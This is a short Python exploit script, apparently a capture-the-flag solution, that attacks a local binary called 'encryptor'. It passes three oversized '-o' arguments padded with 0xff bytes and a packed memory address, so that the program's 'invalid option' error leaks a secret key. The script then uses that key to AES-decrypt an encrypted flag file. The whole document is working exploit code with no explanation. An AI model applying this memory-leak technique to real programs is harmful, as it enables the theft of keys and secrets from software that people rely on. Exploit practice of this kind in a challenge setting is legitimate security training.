from ptrlib import *
from Crypto.Cipher import AES

payload = [None] * 3
for i in range(3):
    payload[i]  = b'\xff' * (0x21a - i)
    payload[i] += p64(0x602260)
    payload[i] = payload[i].strip(b'\x00')

sock = Process([
    "./encryptor",
    "-o", payload[0],
    "-o", payload[1],
    "-o", payload[2],
    "-x"
], cwd="../files/")

r = sock.recvregex("(.+): invalid option")
secret = r[0]
logger.info(b"secret = " + secret)
sock.close()

with open("../files/flag.enc", "rb") as f:
    cipher = f.read()
    aes = AES.new(secret, AES.MODE_ECB)
    print(aes.decrypt(cipher))
